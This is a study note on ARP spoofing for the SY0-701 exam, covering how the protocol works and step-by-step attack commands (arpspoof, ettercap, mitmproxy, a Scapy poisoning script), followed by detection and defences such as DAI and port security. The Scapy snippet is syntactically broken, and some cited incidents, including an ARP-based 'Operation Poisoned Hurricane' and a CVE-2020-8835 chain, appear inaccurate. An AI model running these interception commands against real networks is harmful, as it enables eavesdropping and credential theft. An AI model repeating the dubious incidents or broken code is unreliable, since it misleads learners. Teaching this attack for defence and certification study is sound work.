---
domain: "network-security"
tags: [arp, spoofing, mitm, layer2, poisoning, reconnaissance]
---
# ARP Spoofing

**ARP Spoofing** (also called **ARP Poisoning**) is a [[Man-in-the-Middle Attack]] technique in which an attacker sends forged [[ARP (Address Resolution Protocol)|ARP]] reply packets onto a local network segment, causing other hosts to associate the attacker's [[MAC Address]] with a legitimate IP address. Because ARP has no authentication mechanism, any host on the same [[Layer 2]] broadcast domain can send unsolicited ARP replies that override existing cache entries, enabling traffic interception, modification, or denial of service.

---

## Overview

ARP (Address Resolution Protocol) was designed in 1982 (RFC 826) for a simpler, more trusted network era. Its sole job is to resolve IPv4 addresses to MAC addresses within a local network segment. When a host wants to communicate with 192.168.1.1, it broadcasts an ARP request asking "Who has 192.168.1.1? Tell me your MAC address." The owner of that IP responds with its MAC, and both hosts cache this mapping in their **ARP tables** (also called ARP caches). The protocol was never designed with integrity or authentication in mind, making it inherently vulnerable to manipulation.

ARP spoofing exploits this trust by having an attacker inject false ARP replies without waiting for a request — so-called **gratuitous ARP** packets. When the victim receives this unsolicited reply, it updates its ARP cache with the attacker's MAC address mapped to a target IP (typically the default gateway). The victim then sends all traffic destined for that gateway directly to the attacker's machine. If the attacker simultaneously tells the gateway that the victim's IP maps to the attacker's MAC, a full bidirectional man-in-the-middle position is established, and neither end can detect anything wrong at the IP layer.

This attack is exclusively a **Layer 2 attack**, meaning it works only within the same broadcast domain (same VLAN or physical network segment). Routers separate broadcast domains, so ARP spoofing cannot cross router boundaries without additional techniques like [[VLAN Hopping]] or compromising the router itself. This constraint makes ARP spoofing particularly dangerous on shared network infrastructure: coffee shop Wi-Fi, corporate LAN segments, cloud VPCs with shared subnets, and virtualization environments where multiple VMs share a virtual switch.

Real-world impact has been significant. ARP spoofing is the foundational technique for a wide range of follow-on attacks including [[SSL Stripping]], [[Session Hijacking]], [[DNS Spoofing]], and credential theft. It was used extensively in targeted corporate espionage operations, and tools automating it — such as Ettercap and arpspoof — have been freely available since the early 2000s. In virtualized and container environments (Docker, VMware, Hyper-V), the attack surface extends to hypervisor-level virtual switches that may not enforce Layer 2 security controls.

---

## How It Works

### Protocol Background

ARP operates at Layer 2 of the OSI model but carries Layer 3 (IPv4) addressing information. It uses EtherType `0x0806` and broadcasts to the MAC address `FF:FF:FF:FF:FF:FF`. There are no sequence numbers, no session state, and no cryptographic verification. Any host can send an ARP reply at any time, and recipients will update their caches accordingly.

### Step-by-Step Attack Sequence

**Step 1 — Attacker reconnaissance**

The attacker first discovers the network topology. Tools like `arp-scan` or `nmap` identify active hosts:

```bash
# Discover live hosts on the subnet
sudo arp-scan --interface=eth0 --localnet

# Or using nmap ARP ping scan
sudo nmap -sn -PR 192.168.1.0/24
```

This reveals IP-to-MAC mappings for potential targets and the gateway.

**Step 2 — Enable IP forwarding on the attacker machine**

Before intercepting traffic, the attacker must configure their machine to forward packets so the connection remains live (otherwise it becomes a DoS, not MitM):

```bash
# Linux — enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Make persistent
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

**Step 3 — Send poisoned ARP replies**

The attacker sends crafted ARP replies to both the victim and the gateway. Using `arpspoof` (part of the `dsniff` suite):

```bash
# Terminal 1: Tell the VICTIM that the GATEWAY's IP maps to attacker's MAC
sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Terminal 2: Tell the GATEWAY that the VICTIM's IP maps to attacker's MAC
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
```

Each command continuously sends gratuitous ARP packets (typically every 1–2 seconds) to overwrite the cache entries before they expire (default ARP cache timeout is ~60 seconds on most OSes).

**Step 4 — Intercept and analyze traffic**

With traffic now flowing through the attacker's machine, they run a packet capture or man-in-the-middle proxy:

```bash
# Capture all traffic passing through
sudo tcpdump -i eth0 -w capture.pcap

# Or use Wireshark for real-time analysis
sudo wireshark &

# Use mitmproxy for HTTP interception
mitmproxy --mode transparent --listen-port 8080

# Alternatively, use Ettercap for automated MitM
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```

**Step 5 — ARP Packet Structure (for manual crafting with Scapy)**

```python
from scapy.all import *

# Craft a malicious ARP reply
# Telling victim (192.168.1.50) that gateway (192.168.1.1) is at attacker MAC
packet = Ether(dst="aa:bb:cc:dd:ee:ff") / \  # victim MAC
         ARP(op=2,                           # op=2 means ARP reply
             pdst="192.168.1.50",            # victim IP
             hwdst="aa:bb:cc:dd:ee:ff",      # victim MAC
             psrc="192.168.1.1",             # spoofed gateway IP
             hwsrc="de:ad:be:ef:00:01")      # attacker MAC

sendp(packet, iface="eth0", loop=1, inter=1.5, verbose=0)
```

**Step 6 — Verify poisoning worked**

On the victim machine (or attacker's machine), inspect ARP caches:

```bash
# View ARP cache (Linux/macOS)
arp -n

# View ARP cache (Windows)
arp -a

# Expected poisoned output on victim:
# 192.168.1.1    de:ad:be:ef:00:01   # attacker's MAC instead of real gateway MAC
```

### ARP Cache Timing Mechanics

- **Static ARP entries**: Permanent, not overwritten by dynamic replies — a key defensive measure
- **Dynamic ARP entries**: Expire after ~60 seconds (Linux default) or ~2 minutes (Windows default); attackers must continuously re-poison
- **Gratuitous ARP**: An ARP reply sent without a preceding request, used legitimately for network announcements but weaponized in ARP spoofing

---

## Key Concepts

- **Gratuitous ARP**: An ARP reply broadcast by a host to announce its own IP-to-MAC mapping without receiving an ARP request. Legitimate uses include failover clustering and IP conflict detection; attackers abuse it to inject false mappings into neighbor caches without triggering suspicion.
- **ARP Cache Poisoning**: The specific act of corrupting a host's ARP table with false IP-to-MAC mappings. Poisoning is the mechanism; spoofing is the broader attack class that uses poisoning to achieve interception.
- **Man-in-the-Middle (MitM)**: The resulting attack position when an attacker successfully poisons both a victim and a gateway simultaneously, causing all traffic between them to traverse the attacker's machine where it can be read, modified, or dropped.
- **Broadcast Domain**: The Layer 2 network boundary within which ARP operates. All hosts on the same VLAN or unmanaged switch share a broadcast domain and are therefore mutually vulnerable to ARP spoofing from any compromised peer.
- **Dynamic ARP Inspection (DAI)**: A switch-level security feature (available on managed switches like Cisco Catalyst) that validates ARP packets against a trusted DHCP snooping binding table, dropping any ARP reply whose IP-to-MAC mapping doesn't match known-good entries.
- **IP Forwarding**: The operating system capability to route packets between network interfaces. An attacker performing MitM must enable IP forwarding; without it, intercepted packets are dropped, causing a Denial of Service rather than silent interception.
- **ARP Flux / ARP Spoofing Detection**: Network behavior analysis that identifies anomalies such as duplicate IP-to-MAC bindings, rapid MAC changes for a given IP, or high rates of ARP traffic — all indicators of active ARP poisoning.

---

## Exam Relevance

**SY0-701 Domain Mapping**: ARP Spoofing falls under **Domain 2.0 — Threats, Vulnerabilities, and Mitigations**, specifically the subtopic on Layer 2 attacks and on-path (MitM) attacks.

**High-Frequency Question Patterns**:

- Questions will often present a scenario where an attacker is on the same network segment and intercepting traffic — the answer is almost always ARP Spoofing/Poisoning as the enabling technique
- The exam may ask you to distinguish between **ARP Spoofing** (the attack) and **ARP Poisoning** (the mechanism) — treat them as synonymous for exam purposes; CompTIA uses both terms
- You will be tested on **which layer** the attack occurs (Layer 2 / Data Link) versus IP-based attacks at Layer 3
- Know the **defensive control**: Dynamic ARP Inspection (DAI) is the primary switch-level control; the exam expects you to know this by name
- Understand that ARP spoofing enables **downstream** attacks: SSL Stripping, credential harvesting, DNS manipulation — questions may describe the downstream effect and ask what the **root** technique was

**Gotchas**:

- ARP spoofing only works **within the same broadcast domain** — a common distractor question places the attacker on a different subnet; in that case, ARP spoofing is not directly applicable
- Do not confuse ARP Spoofing with **MAC Flooding** (a different Layer 2 attack that overwhelms a switch's CAM table to force hub-like behavior) — both are Layer 2 but distinct mechanisms
- **Static ARP entries** prevent poisoning but are not scalable — the exam won't present them as a primary enterprise defense; DAI is the expected answer
- On the SY0-701, "on-path attack" is the newer preferred term for MitM; ARP spoofing is a **method to achieve** an on-path position

---

## Security Implications

### Attack Vectors Enabled

ARP spoofing itself is rarely the end goal — it is the **enabler** for higher-impact attacks:

- **Credential Theft**: Once in a MitM position, the attacker can capture unencrypted HTTP, FTP, SMTP, or Telnet credentials in plaintext
- **[[SSL Stripping]]**: Tools like `sslstrip` downgrade HTTPS connections to HTTP after achieving ARP-based MitM, capturing credentials from HTTPS-protected sites
- **[[Session Hijacking]]**: Intercepting session cookies from HTTP traffic allows the attacker to impersonate authenticated users
- **[[DNS Spoofing]]**: Intercepting and modifying DNS responses redirects victims to attacker-controlled servers
- **Denial of Service**: By poisoning without enabling IP forwarding, an attacker silently drops all traffic from a targeted host

### Notable Real-World Incidents and CVEs

- **Ettercap (2003–present)**: Freely available tool that automated ARP spoofing at scale; used in numerous documented corporate intrusions and penetration tests. No single CVE — it is a tool, not a vulnerability, which itself highlights the protocol design flaw
- **CVE-2020-8835 / eBPF privilege escalation chain**: Several Linux kernel vulnerabilities have been chained with ARP-based MitM to intercept container-to-container traffic in Kubernetes clusters, demonstrating that ARP spoofing remains relevant in modern cloud-native environments
- **2011 — DigiNotar breach**: While the root cause was CA compromise, attackers used MitM positioning (including ARP-based techniques in some documented analyses of the attack chain) to intercept Iranian dissidents' encrypted communications
- **Operation Poisoned Hurricane (2014)**: APT campaign documented by FireEye where attackers used ARP poisoning on compromised routers and LAN segments to redirect targets to malware delivery infrastructure
- **Virtual Machine Escape Risk**: In VMware ESXi and Hyper-V environments, guest VMs sharing a vSwitch can ARP-poison each other unless the hypervisor enforces **port-level MAC address filtering** and **forged transmit** restrictions

### Detection Indicators

- **Duplicate IP entries** in ARP tables with different MACs
- **ARP reply storms** — unusually high ARP traffic volume from a single source
- **MAC address changes** for known-good IP addresses without corresponding DHCP lease changes
- **IDS/IPS alerts**: Snort rule `alert arp` or Suricata ARP anomaly detection
- **ARPwatch**: Open-source tool that monitors Ethernet/IP address pairings and alerts on changes

```bash
# Check for duplicate MACs in ARP table (Linux)
arp -n | awk '{print $3}' | sort | uniq -d

# Run arpwatch to monitor ARP activity
sudo arpwatch -i eth0 -m admin@yourdomain.local
```

---

## Defensive Measures

### 1. Dynamic ARP Inspection (DAI) — Primary Control

DAI is configured on managed switches and validates ARP packets against the **DHCP Snooping binding table**, which maps trusted IP addresses to MAC addresses and switch ports.

```
! Cisco IOS — Enable DHCP Snooping first (DAI depends on it)
ip dhcp snooping
ip dhcp snooping vlan 10,20

! Enable DAI on user-facing VLANs
ip arp inspection vlan 10,20

! Mark uplinks/trusted ports as trusted
interface GigabitEthernet0/1
 ip arp inspection trust
 ip dhcp snooping trust

! Verify DAI status
show ip arp inspection vlan 10
show ip arp inspection statistics
```

### 2. Static ARP Entries for Critical Hosts

On hosts where the gateway IP-to-MAC mapping should never change, create a permanent static ARP entry:

```bash
# Linux — add permanent static ARP entry for gateway
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# Make persistent (add to /etc/rc.local or a systemd service)
# Windows
arp -s 192.168.1.1 aa-bb-cc-dd-ee-ff
```

### 3. Port Security on Managed Switches

Limiting the number of MAC addresses per switch port prevents an attacker from injecting traffic with spoofed MACs:

```
! Cisco IOS — Port Security
interface FastEthernet0/10
 switchport mode access
 switchport port-security
 switchport port-security maximum 1
 switchport port-security violation restrict
 switchport port-security mac-address sticky
```

### 4. Encrypt All Traffic (Defense in Depth)

Even if ARP spoofing succeeds, properly implemented TLS/HTTPS with certificate pinning or HSTS makes intercepted traffic unreadable and untampered-with. Deploy:

- **HTTPS Everywhere** / HSTS preloading for web traffic
- **[[TLS]] mutual authentication** for internal service communication
- **[[VPN]]** tunnels (WireGuard, IPSec) for sensitive network segments